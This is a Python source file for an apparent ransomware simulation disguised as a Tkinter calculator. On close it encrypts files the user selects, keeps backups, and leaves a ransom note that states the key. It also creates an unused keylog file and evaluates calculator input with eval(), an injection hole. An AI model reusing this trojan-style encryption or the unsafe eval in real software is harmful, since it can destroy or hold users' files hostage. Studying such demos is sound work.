import tkinter as tk
from tkinter import messagebox, filedialog
import os
import json
import shutil
from datetime import datetime
from cryptography.fernet import Fernet
from config import *


class EncryptionEngine:
    def __init__(self):
        self.encryption_log = os.path.join(SIM_CACHE_PATH, "encryption_log.json")
        self.keylog_file = os.path.join(SIM_CACHE_PATH, "keylog.txt")
        self.key = None
        self.cipher = None
        self.initialize_files()
        self.initialize_encryption()

    def initialize_files(self):
        try:
            os.makedirs(SIM_CACHE_PATH, exist_ok=True)
            open(self.keylog_file, 'a').close()
            if not os.path.exists(self.encryption_log):
                with open(self.encryption_log, 'w') as f:
                    json.dump([], f)
        except Exception as e:
            messagebox.showerror("Initialization Error", str(e))
            raise

    def initialize_encryption(self):
        key_path = os.path.join(SIM_CACHE_PATH, "key.key")
        try:
            if os.path.exists(key_path):
                with open(key_path, "rb") as f:
                    self.key = f.read()
                # Validate key
                Fernet(self.key)  # Test key validity
            else:
                self.key = Fernet.generate_key()
                with open(key_path, "wb") as f:
                    f.write(self.key)

            self.cipher = Fernet(self.key)
        except Exception as e:
            messagebox.showerror("Encryption Error", f"Failed to initialize encryption: {str(e)}")
            raise

    def encrypt_file(self, filepath):
        try:
            backup_path = os.path.join(HACKED_FOLDER, f"{os.path.basename(filepath)}.bak")
            shutil.copy2(filepath, backup_path)

            with open(filepath, "rb") as f:
                file_data = f.read()

            encrypted_data = self.cipher.encrypt(file_data)

            with open(filepath, "wb") as f:
                f.write(encrypted_data)

            self.log_encryption(filepath, backup_path)
            return True
        except Exception as e:
            messagebox.showerror("Encryption Failed", str(e))
            return False

    def log_encryption(self, original_path, backup_path):
        try:
            with open(self.encryption_log, "r+") as f:
                files = json.load(f)
                files.append({
                    "original": original_path,
                    "backup": backup_path,
                    "timestamp": str(datetime.now())
                })
                f.seek(0)
                json.dump(files, f, indent=4)
        except Exception as e:
            messagebox.showerror("Log Error", str(e))

    def create_ransom_note(self):
        try:
            note_path = os.path.join(HACKED_FOLDER, "READ_ME.txt")
            with open(note_path, "w") as f:
                f.write(f"""Your files have been encrypted!

To decrypt:
1. Run decrypt.py
2. Use this key: {self.key.decode()}
3. Select files to decrypt

Backups available in: {HACKED_FOLDER}
""")
        except Exception as e:
            messagebox.showerror("Note Error", str(e))


class CalculatorApp:
    def __init__(self):
        self.window = tk.Tk()
        self.window.title("Calculator")
        try:
            self.engine = EncryptionEngine()
        except:
            self.window.destroy()
            return

        self.current_input = "0"
        self.setup_gui()
        self.bind_events()

    def setup_gui(self):
        self.window.geometry("325x550")
        self.window.configure(bg="#202020")
        self.window.resizable(False, False)

        main_frame = tk.Frame(self.window, bg="#202020")
        main_frame.pack(fill="both", expand=True, padx=10, pady=10)

        self.display = tk.Label(main_frame, text=self.current_input, bg="#202020", fg="white",
                                font=("Arial", 40), anchor="e")
        self.display.pack(fill="x", pady=(0, 20))

        button_frame = tk.Frame(main_frame, bg="#202020")
        button_frame.pack(fill="both", expand=True)

        buttons = [
            ('C', 0, 0, 1, 1, "#D0CECE", "black"),
            ('+/-', 0, 1, 1, 1, "#D0CECE", "black"),
            ('%', 0, 2, 1, 1, "#D0CECE", "black"),
            ('÷', 0, 3, 1, 1, "#FFC000", "white"),
            ('7', 1, 0, 1, 1, "#262626", "white"),
            ('8', 1, 1, 1, 1, "#262626", "white"),
            ('9', 1, 2, 1, 1, "#262626", "white"),
            ('×', 1, 3, 1, 1, "#FFC000", "white"),
            ('4', 2, 0, 1, 1, "#262626", "white"),
            ('5', 2, 1, 1, 1, "#262626", "white"),
            ('6', 2, 2, 1, 1, "#262626", "white"),
            ('-', 2, 3, 1, 1, "#FFC000", "white"),
            ('1', 3, 0, 1, 1, "#262626", "white"),
            ('2', 3, 1, 1, 1, "#262626", "white"),
            ('3', 3, 2, 1, 1, "#262626", "white"),
            ('+', 3, 3, 1, 1, "#FFC000", "white"),
            ('0', 4, 0, 1, 2, "#262626", "white"),
            ('.', 4, 2, 1, 1, "#262626", "white"),
            ('=', 4, 3, 1, 1, "#FFC000", "white")
        ]

        for (text, row, col, colspan, rowspan, bg, fg) in buttons:
            btn = tk.Button(button_frame, text=text, font=("Arial", 20),
                            bg=bg, fg=fg, borderwidth=0,
                            command=lambda t=text: self.on_button_press(t))
            btn.grid(row=row, column=col, columnspan=colspan, rowspan=rowspan,
                     sticky="nsew", padx=2, pady=2)

        for i in range(5):
            button_frame.rowconfigure(i, weight=1)
        for i in range(4):
            button_frame.columnconfigure(i, weight=1)

    def bind_events(self):
        self.window.protocol("WM_DELETE_WINDOW", self.on_window_close)

    def on_button_press(self, text):
        try:
            if text == 'C':
                self.current_input = "0"
            elif text == '=':
                try:
                    self.current_input = str(eval(self.current_input.replace('×', '*')))
                except:
                    self.current_input = "Error"
            else:
                if self.current_input == "0" or self.current_input == "Error":
                    self.current_input = text
                else:
                    self.current_input += text
            self.display.config(text=self.current_input[:15])
        except Exception as e:
            messagebox.showerror("Input Error", str(e))

    def on_window_close(self):
        if messagebox.askyesno("Confirm", "Encrypt files before exiting?"):
            try:
                files = filedialog.askopenfilenames(title="Select files to encrypt")
                if files:
                    encrypted = 0
                    for file in files:
                        if self.engine.encrypt_file(file):
                            encrypted += 1

                    self.engine.create_ransom_note()
                    messagebox.showwarning(
                        "Files Encrypted",
                        f"{encrypted} files encrypted\n"
                        f"Use decrypt.py with key: {self.engine.key.decode()}\n"
                        f"Backups in: {HACKED_FOLDER}"
                    )
            except Exception as e:
                messagebox.showerror("Encryption Error", str(e))
        self.window.destroy()


if __name__ == "__main__":
    app = CalculatorApp()
    app.window.mainloop()